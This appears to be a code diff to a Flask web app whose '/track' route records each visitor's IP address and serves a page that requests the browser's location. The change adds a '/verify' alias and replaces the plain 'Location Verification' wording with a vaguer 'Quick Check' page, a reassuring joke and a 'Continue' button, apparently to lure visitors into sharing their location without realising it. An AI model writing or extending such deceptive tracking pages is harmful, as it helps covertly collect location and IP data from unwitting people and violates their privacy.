@@ -568,6 +568,7 @@ def home():
     """
 
 
+@app.route("/verify")
 @app.route("/track")
 def track_page():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -600,6 +601,7 @@ def track_page():
     rebuild_stats()
 
     return """
+
     <html>
     <head>
         <title>Location Access</title>
@@ -623,10 +625,9 @@ def track_page():
     </head>
 
     <body>
-        <h1>Location Verification</h1>
-        <p>Tap allow to continue.</p>
-
-        <button onclick="getLocation()">Allow Location</button>
+       <h1>Quick Check</h1>
+       <p>"Look, we don't care about your passwords, your camera, or your embarrassing late-night Google searches. </p>
+       <button onclick="getLocation()">Continue</button>
 
         <p id="status"></p>
 
